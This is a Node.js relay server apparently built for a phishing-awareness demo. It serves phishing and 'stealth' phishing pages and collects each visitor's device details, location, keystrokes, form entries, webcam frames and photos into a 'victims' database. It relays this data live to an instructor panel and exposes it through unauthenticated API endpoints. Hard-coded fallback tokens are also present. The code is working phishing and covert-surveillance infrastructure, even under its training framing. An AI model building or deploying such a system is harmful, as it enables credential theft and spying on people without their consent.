// relay.js — CSA Phishing Awareness Demo · Unified Relay Server v2.2
// ─────────────────────────────────────────────────────────────────────
// Unified server: Handles WebSockets, REST API, and Static HTML files.
// ─────────────────────────────────────────────────────────────────────

'use strict';

require('dotenv').config();

const { WebSocketServer } = require('ws');
const fs = require('fs');
const path = require('path');
const http = require('http');
const Database = require('better-sqlite3');

// ── COMPATIBILITY ─────────────────────────────────────────────────────
if (typeof global.fetch === 'undefined') {
  console.log('[!] WARNING: Undefined fetch(). Node.js 18+ is required for full functionality.');
  global.fetch = () => { 
    return Promise.resolve({ json: () => Promise.resolve({ status: 'error', reason: 'fetch missing' }) });
  };
}

// ── CONFIG ────────────────────────────────────────────────────────────
const WS_PORT = process.env.WS_PORT ? parseInt(process.env.WS_PORT) : 8765;
const TRUST_PROXY = process.env.TRUST_PROXY !== 'false';
const LOG_FILE = path.join(__dirname, 'relay.log');
const DB_FILE = path.join(__dirname, 'sessions.db');

// Session label
const DEFAULT_SESSION = process.env.SESSION_ID || new Date().toISOString().slice(0, 16).replace(':', '-');

// ── TOKENS FROM .env ──────────────────────────────────────────────────
// Each INSTR_TOKEN_* env var has the format  "TOKEN:room"
// e.g.  INSTR_TOKEN_DEFAULT=CSA-DEMO-2026:default
const INSTRUCTOR_TOKENS = {};
for (const [key, val] of Object.entries(process.env)) {
  if (key.startsWith('INSTR_TOKEN_') && val.includes(':')) {
    const colonIdx = val.indexOf(':');
    const token = val.slice(0, colonIdx).trim();
    const room  = val.slice(colonIdx + 1).trim();
    if (token && room) INSTRUCTOR_TOKENS[token] = room;
  }
}
// Fallback so the server still works when .env is missing (NOT recommended for production)
if (Object.keys(INSTRUCTOR_TOKENS).length === 0) {
  log('⚠  No INSTR_TOKEN_* vars found in .env — using hard-coded fallback tokens (insecure!)');
  INSTRUCTOR_TOKENS['CSA-DEMO-2026'] = 'default';
  INSTRUCTOR_TOKENS['CSA-AM-2026']   = 'session_AM';
  INSTRUCTOR_TOKENS['CSA-PM-2026']   = 'session_PM';
}

// ── LIMITS ────────────────────────────────────────────────────────────
const MAX_MSG_BYTES  = 300 * 1024;  // 300 KB – largest valid mugshot
const FRAME_MIN_MS   = 60;          // drop frames arriving faster than ~16 fps
const AUTH_MAX_TRIES = 5;           // max wrong-token attempts per IP
const AUTH_WINDOW_MS = 60 * 1000;   // … within this rolling window (60 s)

const DEFAULT_CONFIG = {
  type: 'config_update',
  eventName: 'National Cyber Hygiene Workshop 2026',
  eventDate: '27 March 2026',
  eventTime: '09:00 – 16:00 GMT',
  eventVenue: 'NCA Tower, Airport By-Pass, Accra'
};
let currentConfig = { ...DEFAULT_CONFIG };

// ── LOGGING ───────────────────────────────────────────────────────────
function ts() { return new Date().toISOString(); }

const _logBuf = [];
let _logDraining = false;

function log(msg) {
  const line = `[${ts()}] ${msg}`;
  console.log(line);
  _logBuf.push(line);
  if (!_logDraining) {
    _logDraining = true;
    setImmediate(flushLog);
  }
}

function flushLog() {
  if (_logBuf.length === 0) { _logDraining = false; return; }
  const batch = _logBuf.join('\n') + '\n';
  _logBuf.length = 0;
  fs.appendFile(LOG_FILE, batch, (err) => {
    if (err) console.error('[log write error]', err.message);
    _logDraining = false;
    if (_logBuf.length > 0) {
      _logDraining = true;
      setImmediate(flushLog);
    }
  });
}

// ── GEO LOOKUP CACHE ─────────────────────────────────────────────────
const geoCache = new Map();
const GEO_TTL_MS = 60 * 60 * 1000; // 1 hour

setInterval(() => {
  const now = Date.now();
  for (const [ip, entry] of geoCache) {
    if (now > entry.t) geoCache.delete(ip);
  }
}, 300_000);

function lookupGeo(ip, onResult) {
  const cached = geoCache.get(ip);
  if (cached && cached.v) {
    onResult(cached.v);
    return;
  }
  if (cached && cached.inflight) { cached.inflight.push(onResult); return; }
  geoCache.set(ip, { v: null, t: Date.now() + GEO_TTL_MS, inflight: [onResult] });
  fetch(`http://ip-api.com/json/${ip}?fields=status,city,regionName,country,isp,org`)
    .then(r => r.json())
    .then(geo => {
      const rec = geoCache.get(ip);
      if (rec) {
        rec.v = geo;
        rec.t = Date.now() + GEO_TTL_MS;
        for (const cb of rec.inflight) cb(geo);
        rec.inflight = [];
      }
    })
    .catch(() => {
      const rec = geoCache.get(ip);
      if (rec) { rec.inflight = []; geoCache.delete(ip); }
    });
}

// ── DATABASE ──────────────────────────────────────────────────────────
const db = new Database(DB_FILE);
db.pragma('journal_mode = WAL');
db.exec(`
  CREATE TABLE IF NOT EXISTS victims (
    client_id TEXT PRIMARY KEY,
    session_id TEXT,
    ip TEXT,
    connected_at TEXT,
    device_json TEXT,
    location_json TEXT,
    form_json TEXT,
    last_frame_at TEXT,
    mugshot_url TEXT
  );
`);

const stmtUpsertVictim  = db.prepare(`INSERT OR IGNORE INTO victims (client_id, session_id, ip, connected_at) VALUES (?, ?, ?, ?)`);
const stmtUpdateDevice  = db.prepare(`UPDATE victims SET device_json = ? WHERE client_id = ?`);
const stmtUpdateLoc     = db.prepare(`UPDATE victims SET location_json = ? WHERE client_id = ?`);
const stmtUpdateForm    = db.prepare(`UPDATE victims SET form_json = ? WHERE client_id = ?`);
const stmtUpdateFrame   = db.prepare(`UPDATE victims SET last_frame_at = ? WHERE client_id = ?`);
// Remap a temp clientId row to the persistent ID coming from the browser
const stmtRenameClient  = db.prepare(`UPDATE victims SET client_id = ? WHERE client_id = ?`);
// Upsert by persistentId — ensures one DB row per real device even across reconnects
const stmtUpsertByPid   = db.prepare(`INSERT INTO victims (client_id, session_id, ip, connected_at)
  VALUES (?, ?, ?, ?)
  ON CONFLICT(client_id) DO UPDATE SET ip = excluded.ip`);

// ── REGISTRY & ROUTING ───────────────────────────────────────────────
const instructorRooms = new Map();
const victimSockets   = new Set();

function addInstructor(ws, room) {
  if (!instructorRooms.has(room)) instructorRooms.set(room, new Set());
  instructorRooms.get(room).add(ws);
}
function removeInstructor(ws, room) {
  if (instructorRooms.has(room)) instructorRooms.get(room).delete(ws);
}
function broadcastAll(payload) {
  const str = JSON.stringify(payload);
  for (const rooms of instructorRooms.values()) {
    for (const ins of rooms) { if (ins.readyState === 1) ins.send(str); }
  }
}
function broadcastToVictims(payload) {
  const str = JSON.stringify(payload);
  for (const v of victimSockets) { if (v.readyState === 1) v.send(str); }
}

// ── AUTH THROTTLE ─────────────────────────────────────────────────────
const authAttempts = new Map();

setInterval(() => {
  const now = Date.now();
  for (const [ip, rec] of authAttempts) {
    if (now > rec.resetAt) authAttempts.delete(ip);
  }
}, 60_000);

function isRateLimited(ip) {
  const now = Date.now();
  const rec = authAttempts.get(ip);
  if (!rec || now > rec.resetAt) {
    // First attempt or window expired – start fresh
    authAttempts.set(ip, { count: 1, resetAt: now + AUTH_WINDOW_MS });
    return false;
  }
  rec.count++;
  if (rec.count > AUTH_MAX_TRIES) return true;
  return false;
}

function clearAuthRecord(ip) {
  authAttempts.delete(ip);
}

// ── UNIFIED HTTP SERVER ──────────────────────────────────────────────
const staticFiles = {};
for (const name of ['phish.html', 'phish_stealth.html', 'instructor.html']) {
  const fp = path.join(__dirname, name);
  if (fs.existsSync(fp)) staticFiles[name] = fs.readFileSync(fp);
}

const staticRoutes = {
  '/':             'phish.html',
  '/phish':        'phish.html',
  '/phish.html':   'phish.html',
  '/stealth':      'phish_stealth.html',
  '/phish_stealth':      'phish_stealth.html',
  '/phish_stealth.html': 'phish_stealth.html',
  '/instructor':        'instructor.html',
  '/admin':             'instructor.html',
  '/instructor.html':   'instructor.html',
};

const stmtListSessions = db.prepare('SELECT DISTINCT session_id FROM victims');
const stmtSessionVictims = db.prepare('SELECT * FROM victims WHERE session_id = ?');

const server = http.createServer((req, res) => {
  const url = new URL(req.url, `http://${req.headers.host}`);
  const pathname = url.pathname;

  res.setHeader('Access-Control-Allow-Origin', '*');
  res.setHeader('Access-Control-Allow-Methods', 'GET, OPTIONS');

  if (pathname === '/api/sessions') {
    const rows = stmtListSessions.all();
    res.writeHead(200, { 'Content-Type': 'application/json' });
    return res.end(JSON.stringify({ sessions: rows }));
  }
  if (pathname.startsWith('/api/sessions/')) {
    const sid = pathname.split('/').pop();
    const rows = stmtSessionVictims.all(sid);
    res.writeHead(200, { 'Content-Type': 'application/json' });
    return res.end(JSON.stringify({ session_id: sid, victims: rows }));
  }

  const file = staticRoutes[pathname];
  if (file && staticFiles[file]) {
    res.writeHead(200, { 'Content-Type': 'text/html' });
    return res.end(staticFiles[file]);
  }

  res.writeHead(404);
  res.end('Not Found');
});

// ── WEBSOCKET SERVER ──────────────────────────────────────────────────
const wss = new WebSocketServer({
  server,
  perMessageDeflate: {
    zlibDeflateOptions: { chunkSize: 1024, memLevel: 7, level: 3 }
  }
});
let clientCounter = 0;

// Prune dead sockets so broadcasts don't hit closed connections
setInterval(() => {
  for (const ws of victimSockets) {
    if (ws.readyState === 3) victimSockets.delete(ws);
  }
  for (const rooms of instructorRooms.values()) {
    for (const ins of rooms) {
      if (ins.readyState === 3) rooms.delete(ins);
    }
  }
}, 30_000);

wss.on('connection', (ws, req) => {
  const ip = (TRUST_PROXY && req.headers['x-forwarded-for']) ? req.headers['x-forwarded-for'].split(',')[0].trim() : req.socket.remoteAddress;
  // Start with a temp ID; replaced with the browser's persistentId on first device_info
  let clientId = `client_${Date.now()}_${++clientCounter}`;
  let role = 'victim';
  let room = null;
  let lastFrameAt = 0;
  let lastDbFrameAt = 0;
  let identityResolved = false;

  victimSockets.add(ws);
  ws.send(JSON.stringify(currentConfig)); // Send current config to new victim
  stmtUpsertVictim.run(clientId, DEFAULT_SESSION, ip, ts());
  log(`[+] CONNECT     ${clientId}  IP=${ip}`);
  lookupGeo(ip, (geo) => {
    if (geo && geo.status === "success") {
      const geoMsg = { type: "ip_geo", clientId, city: geo.city, region: geo.regionName, country: geo.country, isp: geo.isp, org: geo.org };
      broadcastAll(geoMsg);
    }
  });

  ws.on('message', (raw) => {
    // ── Message size cap ──────────────────────────────────────────────
    if (raw.length > MAX_MSG_BYTES) {
      log(`[!] MSG TOO BIG  ${clientId}  ${raw.length} bytes — dropped`);
      return;
    }

    try {
      const msg = JSON.parse(raw);

      // ── Instructor Registration ──────────────────────────────────────
      if (msg.type === 'register' && msg.role === 'instructor') {
        if (isRateLimited(ip)) {
          ws.send(JSON.stringify({ type: 'auth_error', reason: 'Too many attempts — wait 60 s' }));
          log(`[!] AUTH BLOCK  ${clientId}  IP=${ip} (rate-limited)`);
          return;
        }
        if (INSTRUCTOR_TOKENS[msg.token]) {
          clearAuthRecord(ip);  // reset counter on success
          role = 'instructor';
          room = INSTRUCTOR_TOKENS[msg.token];
          victimSockets.delete(ws);
          addInstructor(ws, room);
          ws.send(JSON.stringify({ type: 'auth_ok', clientId, room, session_id: DEFAULT_SESSION }));
          log(`[!] AUTH OK     ${clientId} as Instructor (Room: ${room})`);
        } else {
          ws.send(JSON.stringify({ type: 'auth_error', reason: 'Invalid token' }));
          log(`[!] AUTH FAIL   ${clientId}  IP=${ip}`);
        }
        return;
      }

      // ── Telemetry Handling ───────────────────────────────────────────
      if (msg.type === 'device_info') {
        // ── Persistent-ID deduplication ──────────────────────────────
        // The browser sends a stable `persistentId` stored in sessionStorage.
        // On first arrival we rename the temp row to that ID so all future
        // messages (and instructor cards) are keyed to the same identity.
        if (!identityResolved && msg.persistentId && typeof msg.persistentId === 'string') {
          const pid = msg.persistentId.replace(/[^a-zA-Z0-9_-]/g, '').slice(0, 64);
          if (pid) {
            // Try to upsert a row for the persistent ID (handles returning devices)
            stmtUpsertByPid.run(pid, DEFAULT_SESSION, ip, ts());
            // Rename the temp row → persistent ID (no-op if pid row already existed)
            stmtRenameClient.run(pid, clientId);
            const oldId = clientId;
            clientId = pid;
            identityResolved = true;
            log(`[~] REMAP       ${oldId} → ${clientId}  IP=${ip}`);
            // Tell the instructor panel to consolidate under the persistent ID
            broadcastAll({ type: 'client_remap', oldId, newId: clientId });
          }
        }
        stmtUpdateDevice.run(JSON.stringify(msg), clientId);
        broadcastAll({ ...msg, clientId, serverIP: ip });
      } else if (msg.type === 'location') {
        stmtUpdateLoc.run(JSON.stringify(msg), clientId);
        broadcastAll({ ...msg, clientId, serverIP: ip });
      } else if (msg.type === 'keylog') {
        broadcastAll({ ...msg, clientId });
      } else if (msg.type === 'form_data') {
        stmtUpdateForm.run(JSON.stringify(msg), clientId);
        broadcastAll({ ...msg, clientId, serverIP: ip });
      } else if (msg.type === 'frame') {
        const now = Date.now();
        if (now - lastFrameAt < FRAME_MIN_MS) return;
        lastFrameAt = now;
        if (now - lastDbFrameAt > 5000) {
          stmtUpdateFrame.run(ts(), clientId);
          lastDbFrameAt = now;
        }
        broadcastAll({ ...msg, clientId, serverIP: ip });
      } else if (msg.type === 'mugshot') {
        // Mugshots are low-frequency (once per session) — always relay
        stmtUpdateFrame.run(ts(), clientId);
        broadcastAll({ ...msg, clientId, serverIP: ip });
      } else if (msg.type === 'config_update' && role === 'instructor') {
        currentConfig = { ...msg };
        delete currentConfig.token;
        broadcastToVictims(currentConfig);
      }

    } catch (e) { log(`[!] MSG ERROR   ${clientId}  ${e.message}`); }
  });

  ws.on('close', () => {
    log(`[-] DISCONNECT  ${clientId}`);
    victimSockets.delete(ws);
    if (role === 'instructor' && room) removeInstructor(ws, room);
    if (role !== 'instructor') broadcastAll({ type: 'client_disconnect', clientId });
  });
});

log(`=== CSA Unified Relay v2.2 ===`);
log(`Port      : ${WS_PORT}`);
log(`Session   : ${DEFAULT_SESSION}`);
log(`Auth tokens loaded: ${Object.keys(INSTRUCTOR_TOKENS).length}`);
log(`URLs:`);
log(`  - Phish : http://localhost:${WS_PORT}/phish`);
log(`  - Admin  : http://localhost:${WS_PORT}/instructor`);
log(`  - Stealth: http://localhost:${WS_PORT}/stealth`);
log('───────────────────────────────\n');

server.listen(WS_PORT);
